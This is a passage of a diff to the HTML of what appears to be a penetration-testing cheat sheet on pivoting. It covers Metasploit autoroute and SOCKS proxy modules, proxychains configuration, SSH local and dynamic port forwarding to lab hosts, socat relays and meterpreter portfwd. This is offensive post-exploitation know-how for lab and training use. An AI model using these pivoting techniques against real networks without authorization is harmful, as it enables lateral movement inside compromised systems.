+</span></span><span class="line"><span class="cl"><span class="go">route flush
+</span></span></span></code></pre></div><h4 id="socks5">Socks5</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use auxiliary/server/socks_proxy
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy
+</span></span></span><span class="line"><span class="cl"><span class="go">msf6 auxiliary(server/socks_proxy) &gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Set socks port <span class="o">[</span>optional<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="go">set SRVPORT &lt;SOCKS_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 1081
+</span></span></span><span class="line"><span class="cl"><span class="go">SRVPORT =&gt; 1081
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 auxiliary(server/socks_proxy) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Auxiliary module running as background job 0.
+</span></span></span><span class="line"><span class="cl"><span class="go">msf6 auxiliary(server/socks_proxy) &gt; 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting the SOCKS proxy server              &lt;----- Press Enter
+</span></span></span></code></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo nano /etc/proxychains4.conf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add to the end of the file
+</span></span><span class="line"><span class="cl"><span class="go">socks5 127.0.0.1 &lt;SOCKS_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Example, in our <span class="nb">local</span> machine
+</span></span><span class="line"><span class="cl"><span class="go">proxychains4 curl http://172.16.1.100:1081
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> SSH port forwarding without spawning a shell
 </span></span><span class="line"><span class="cl"><span class="go">ssh -N -L &lt;TARGET_PORT&gt;:127.0.0.1:&lt;TARGET_PORT&gt; &lt;USER&gt;@&lt;TARGET&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ssh -N -L 5985:127.0.0.1:5985 3v4Si0N@10.10.10.240
 </span></span><span class="line"><span class="cl"><span class="go">3v4Si0N@10.10.10.240&#39;s password:  
@@ -379,23 +592,8 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ssh -i id_rsa -N -D <span class="m">1081</span> root@10.10.11.179
 </span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Any traffic go to port &lt;TARGET_PORT&gt; will be forwarded to &lt;LOCAL_IP&gt;:&lt;TARGET_PORT&gt;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab4"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Any traffic go to port &lt;TARGET_PORT&gt; will be forwarded to &lt;LOCAL_IP&gt;:&lt;TARGET_PORT&gt;
 </span></span><span class="line"><span class="cl"><span class="go">./socat tcp-listen:&lt;TARGET_PORT&gt;,fork tcp:&lt;LOCAL_IP&gt;:&lt;TARGET_PORT&gt; &amp;
-</span></span></span></code></pre></div></div>
-
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab4"><h4 id="ports-forwarding">Ports forwarding</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add
-</span></span><span class="line"><span class="cl"><span class="go">portfwd add -l &lt;TARGET_PORT&gt; -r 127.0.0.1 -p &lt;TARGET_PORT&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Delete
-</span></span><span class="line"><span class="cl"><span class="go">portfwd delete -l &lt;TARGET_PORT&gt; -r 127.0.0.1 -p &lt;TARGET_PORT&gt;
-</span></span></span></code></pre></div><h4 id="socks5">Socks5</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> First add routes to target subnet
-</span></span><span class="line"><span class="cl"><span class="go">use post/multi/manage/autoroute
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set session &lt;ID&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Then create socks proxy
-</span></span><span class="line"><span class="cl"><span class="go">use auxiliary/server/socks_proxy
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab5"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">socks5 start
